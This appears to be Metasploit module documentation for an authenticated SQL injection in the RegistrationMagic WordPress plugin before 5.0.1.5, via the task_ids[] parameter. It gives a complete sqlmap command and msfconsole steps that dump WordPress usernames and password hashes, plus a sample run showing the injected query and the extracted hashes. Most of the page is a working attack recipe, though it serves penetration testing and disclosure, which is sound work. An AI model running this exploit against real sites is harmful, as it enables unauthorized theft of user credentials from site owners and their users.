## Vulnerable Application

RegistrationMagic, a WordPress plugin,
prior to 5.0.1.5 is affected by an authenticated SQL injection via the
`task_ids[]` parameter.

The plugin can be downloaded
[here](https://downloads.wordpress.org/plugin/custom-registration-form-builder-with-submission-manager.5.0.1.5.zip)

This module slightly replicates sqlmap running as:

```
sqlmap -u 'http://<IP>/wp-admin/admin-ajax.php?page=rm_ex_chronos_edit_task&rm_form_id=2' --data="action=rm_chronos_ajax&rm_chronos_ajax_action=duplicate_tasks_batch&task_ids[]=2" -p "task_ids[]" --technique T -T wp_users -C user_login,user_pass --dump --dbms mysql --cookie '<cookie>'
```

## Verification Steps

1. Install the plugin, use defaults
2. Start msfconsole
3. Do: `use auxiliary/scanner/http/wp_registrationmagic_sqli`
4. Do: `set rhosts [ip]`
5. Do: `set username [username]`
6. Do: `set password [password]`
7. Do: `run`
8. You should get the users and hashes returned.

## Options

### ACTION: List Users

This action lists `COUNT` users and password hashes.

### COUNT

If action `List Users` is selected (default), this is the number of users to enumerate.
The larger this list, the more time it will take.  Defaults to `1`.

### USERNAME

The username to login with. Defaults to ``.

### PASSWORD

The password to login with. Defaults to ``.

## Scenarios

### Registration Magic 5.0.1.5 on Wordpress 5.7.5 on Ubuntu 20.04

```
[*] Processing registrationmagic.rb for ERB directives.
resource (registrationmagic.rb)> use auxiliary/scanner/http/wp_registrationmagic_sqli
resource (registrationmagic.rb)> set rhosts 1.1.1.1
rhosts => 1.1.1.1
resource (registrationmagic.rb)> set verbose true
verbose => true
resource (registrationmagic.rb)> set username admin
username => admin
resource (registrationmagic.rb)> set password admin
password => admin
resource (registrationmagic.rb)> run
[*] Checking /wp-content/plugins/custom-registration-form-builder-with-submission-manager/readme.txt
[*] Found version 5.0.1.5 in the plugin
[+] Vulnerable version of RegistrationMagic detected
[*] Using formid of: 74
[*] Enumerating Usernames and Password Hashes
[*] {SQLi} Executing (select group_concat(GPc) from (select cast(concat_ws(';',ifnull(user_login,''),ifnull(user_pass,'')) as binary) GPc from wp_users limit 3) PfXJX)
[*] {SQLi} Encoded to (select group_concat(GPc) from (select cast(concat_ws(0x3b,ifnull(user_login,repeat(0xc,0)),ifnull(user_pass,repeat(0x24,0))) as binary) GPc from wp_users limit 3) PfXJX)
[*] {SQLi} Time-based injection: expecting output of length 124
[+] Dumped table contents:
wp_users
========

 user_login  user_pass
 ----------  ---------
 admin       $P$BZlPX7NIx8MYpXokBW2AGsN7i.aUOt0
 admin2      $P$BNS2BGBTHmjIgV0nZWxAZtRfq1l19p1
 editor      $P$BdWSGpy/tzJomNCh30a67oJuBEcW0K/

[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```
